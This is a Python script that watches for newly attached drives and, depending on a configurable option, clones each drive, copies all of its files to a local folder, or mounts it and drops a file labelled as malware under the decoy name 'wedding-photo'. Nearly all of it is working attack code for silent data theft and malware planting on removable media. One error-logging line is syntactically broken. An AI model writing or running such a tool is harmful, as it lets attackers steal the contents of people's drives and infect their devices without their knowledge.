#!/usr/bin/env python

from __future__ import absolute_import
from __future__ import print_function
import platform
import sys
import os
import subprocess
import shutil
import time
import pyudev
import random
#Options:
#0 Bit By bit Clone of device
	#opt = 0
	#dest = '/path/to/copy/filename
#1 Upload malware to device
	#opt = 1
	#dest = '/path/to/malware
	#filename = 'filename'
#2 Overwrite a partition with your own
	#opt = 2
	#dest = '/path/to/overwrite-file
#3 Clone (File Level) of device
	#opt = 3
	#dest = '/path/to/save/files'
opt = 3
dest = '/root/Desktop/Files'
filename = 'wedding-photo'
def clone_partition(addr):
	global dest
	print(("[{}] Cloning {} > {}").format(hex(id(addr)), addr,dest))
	try:
		shutil.copyfile(addr, dest)
		return 0
	except KeyboardInterrupt:
		print("Interrupted...")
	except Exception as e:
		f = open('Error'+str(random.getrandbits(10))+'.log', 'w+')
		f.write(str(time.ctime())+
'+str(e)+'
)
		f.close()
		print(("Device Clone Interruption at {}").format(time.ctime()))
		return 1
c_val = 0
def upload_malware(addr):
	global dest
	global filename
	global c_val
	print(("[{}] Uploading Malware to > {}").format(time.ctime(),addr))
	if(platform.system() == 'Windows'):
		print(("[{}] Unable to mount {} | Windows Support not available").format(time.ctime(),addr))
		return 1
	elif(platform.system() != 'Windows'):
		try:
			subprocess.call('umount -f '+str(addr),shell=True)
		except:
			if(c_val == 0):
				print(("[{}] Unable to dismount {} (Re-Trying)").format(time.ctime(),addr))
				c_val = 1
				time.sleep(10)
			elif(c_val == 1):
				return 1
		dir_name = str(random.getrandbits(10))
		os.mkdir(dir_name)
		try:
			subprocess.call('mount '+addr+' '+dir_name, shell=True)
			time.sleep(2)
		except:
			print(("[{}] Unable to mount {} -> {}").format(time.ctime(), addr,dir_name))
			f = open(dir_name+'/x', 'w+')
			f.close()
			shutil.rmtree(dir_name)
			return 1
		try:
			time.sleep(2)
			c_dir = os.getcwd()
			os.chdir(dir_name)
			os.chdir(c_dir)
			shutil.copyfile(dest,dir_name+'/'+filename)
			print(("[{}] Copied {} -> {} @ {}").format(time.ctime(),dest,addr,hex(id(addr))))
			try:
				time.sleep(2)
				subprocess.call('umount '+addr, shell=True)
			except:
				print(("[{}] Could not dismount {}").format(time.ctime(),addr))
				return 2
		except:
			print(("[{}] Unable to write to -> {} @ {} (Read Only System?)").format(time.ctime(),addr,hex(id(addr))))
			return 1
		c_dir = os.getcwd()
		os.chdir(dir_name)
		f = open('x', 'w+')
		f.close()
		os.chdir(c_dir)
		shutil.rmtree(dir_name)
		return 0
def file_clone_device(addr):
	global dest
	global c_val
	print(("[{}] Copying {} files to > {}").format(time.ctime(),addr,dest))
	if(platform.system() == 'Windows'):
		print(("[{}] Unable to mount {} | Windows Support not available").format(time.ctime(),addr))
		return 1
	elif(platform.system() != 'Windows'):
		try:
			subprocess.call('umount -f '+str(addr),shell=True)
		except:
			if(c_val == 0):
				print(("[{}] Unable to dismount {} (Re-Trying)").format(time.ctime(),addr))
				c_val = 1
				time.sleep(10)
			elif(c_val == 1):
				return 1
		dir_name = str(random.getrandbits(10))
		os.mkdir(dir_name)
		try:
			subprocess.call('mount '+addr+' '+dir_name, shell=True)
		except:
			print(("[{}] Unable to mount {} -> {}").format(time.ctime(), addr,dir_name))
			f = open(dir_name+'/x', 'w+')
			f.close()
			shutil.rmtree(dir_name)
			return 1
		if(os.path.exists(dest)):
			c_dir = os.getcwd()
			os.chdir(dest)
			f = open('x', 'w+')
			f.close()
			os.chdir(c_dir)
			shutil.rmtree(dest)
		else:
			pass
		try:
			c_dir = os.getcwd()
			os.chdir(dir_name)
			time.sleep(2)
			os.chdir(c_dir)
			shutil.copytree(dir_name,dest)
			print(("[{}] Copied Files of {} @ {}-> {}").format(time.ctime(),addr,hex(id(addr)),dest))
			try:
				subprocess.call('umount '+addr, shell=True)
			except:
				print(("(Unable to dismount -> {})").format(addr))
				return 2
			subprocess.call('rm -rf '+dir_name, shell=True)
			return 0
		except:
			print(("[{}] Unable to copy files of {} @ {}").format(time.ctime(),addr,hex(id(addr))))
			return 1
current_partitions = []
for device in pyudev.Context().list_devices(subsystem='block'):
	if(device.device_node not in current_partitions):
		print(("Found device {} at Memory Location: {}").format(device.device_node, hex(id(device.device_node))))
		current_partitions.append(device.device_node)
print(("[{}] Awaiting for a partition...").format(time.ctime()))
while True:
	devices = pyudev.Context().list_devices(subsystem='block')
	for device in devices:
		if(device.device_node not in current_partitions):
			print(("[{}] Partition Detected: {} @ {}").format(time.ctime(),device.device_node, hex(id(device.device_node))))
			current_partitions.append(device.device_node)
			if(opt == 0):
				exec_clone = clone_partition(device.device_node)
				if(exec_clone == 0):
					print(("[info] {}:{} Device Successfully Cloned > {}").format(device.device_node, hex(id(device.device_node)),dest))
				elif(exec_clone == 1):
					print(("[{}] Unsuccessful copy of {} @ {}").format(time.ctime(), device.device_node, hex(id(device.device_node))))
			if(opt == 1):
				if(device.device_type == 'partition'):
					print(("[{}] ({}) @ {} -> Partition").format(time.ctime(),device.device_node,hex(id(device.device_node))))
					print(("[info] Uploading Malware -> {}").format(device.device_node))
					data = upload_malware(device.device_node)
					if(data == 1):
						print(("[{}] The process was unsucessfully initiated on {} @ {}").format(time.ctime(),device.device_node,hex(id(device.device_node))))
					elif(data == 2):
						print(("[{}] The process was successfully completed but could not dismount {} @ {}").format(time.ctime(),device.device_node,hex(id(device.device_node))))
					elif(data == 0):
						print(("[{}] The process was completed successfully on {} @ {}").format(time.ctime(),device.device_node,hex(id(device.device_node))))
				elif(device.device_type != 'partition'):
					print(('[{}] Detected {} @ {} | Type {} not partition [skipping]').format(time.ctime(),device.device_node,hex(id(device.device_node)),device.device_type))
			elif(opt == 3):
#				print("Hello")
#				print("Device: {} - {}").format(device.device_node,device.device_type)
				if(device.device_type == 'partition'):
					print(("[{}] ({}) @ {} -> Partition").format(time.ctime(),device.device_node,hex(id(device.device_node))))
					print(("[info] Copying files on {}").format(device.device_node))
					data = file_clone_device(device.device_node)
					if(data == 1):
						print(("[{}] The process was unsucessfully initiated on {} @ {}").format(time.ctime(),device.device_node,hex(id(device.device_node))))
					elif(data == 2):
						print(("[{}] The process was successfully completed but could not dismount {} @ {}").format(time.ctime(),device.device_node,hex(id(device.device_node))))
					elif(data == 0):
						print(("[{}] The process was completed successfully on {} @ {}").format(time.ctime(),device.device_node,hex(id(device.device_node))))
				elif(device.device_type != 'partition'):
					print(('[{}] Detected {} @ {} | Type {} not partition [skipping]').format(time.ctime(),device.device_node,hex(id(device.device_node)),device.device_type))
	
